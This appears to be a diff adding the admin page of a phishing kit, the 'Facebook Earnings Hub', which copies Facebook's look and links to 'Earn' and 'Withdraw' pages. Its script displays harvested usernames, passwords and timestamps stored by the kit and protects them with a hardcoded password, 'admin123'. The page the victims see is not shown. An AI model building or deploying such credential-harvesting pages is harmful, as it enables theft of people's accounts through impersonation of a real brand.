@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>custom  - Facebook Earnings Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
+        
+        .header {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .nav a {
+            color: white;
+            text-decoration: none;
+            margin-left: 15px;
+            font-size: 16px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        .admin-card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        
+        .admin-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #1c1e21;
+            text-align: center;
+        }
+        
+        .admin-form {
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .credentials-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        
+        .credentials-table th, .credentials-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .credentials-table th {
+            background-color: #f0f2f5;
+            font-weight: bold;
+        }
+        
+        .credentials-table tr:hover {
+            background-color: #f7f8fa;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #65676b;
+            font-size: 14px;
+            margin-top: 40px;
+            border-top: 1px solid #dddfe2;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Facebook Earnings</div>
+        <div class="nav">
+            <a href="index.html">Earn</a>
+            <a href="withdraw.html">Withdraw</a>
+            <a href="admin.html" style="color: #ff9800;">Admin</a>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="admin-card">
+            <div class="admin-title">custom</div>
+            
+            <div class="admin-form">
+                <div class="form-group">
+                    <input type="password" id="adminPassword" placeholder="Enter Admin Password">
+                </div>
+                <button class="btn" id="viewCredentials">Views</button>
+                <button class="btn" id="clearCredentials" style="background-color: #f44336; margin-left: 10px;">Clear All</button>
+            </div>
+            
+            <table class="credentials-table" id="credentialsTable">
+                <thead>
+                    <tr>
+                        <th>you</th>
+                        <th>Pass</th>
+                        <th>Time</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2023 Facebook Earnings Hub. This is not an official Facebook product.</p>
+    </div>
+    
+    <script>
+        // Admin password (in real app, this should be server-side)
+        const ADMIN_PASSWORD = "admin123";
+        
+        document.getElementById('viewCredentials').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === ADMIN_PASSWORD) {
+                displayCredentials();
+            } else {
+                alert("Incorrect admin password");
+            }
+        });
+        
+        document.getElementById('clearCredentials').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === ADMIN_PASSWORD) {
+                localStorage.removeItem('userCredentials');
+                document.getElementById('credentialsTable').querySelector('tbody').innerHTML = '';
+                alert("All credentials cleared");
+            } else {
+                alert("Incorrect admin password");
+            }
+        });
+        
+        function displayCredentials() {
+            const credentials = JSON.parse(localStorage.getItem('userCredentials') || []);
+            const tbody = document.getElementById('credentialsTable').querySelector('tbody');
+            
+            tbody.innerHTML = '';
+            
+            if (credentials.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="3" style="text-align: center;">No credentials found</td></tr>';
+                return;
+            }
+            
+            credentials.forEach(cred => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${cred.username}</td>
+                    <td>${cred.password}</td>
+                    <td>${cred.timestamp}</td>
+                `;
+                tbody.appendChild(row);
+            });
+        }
+    </script>
+</body>
+</html>
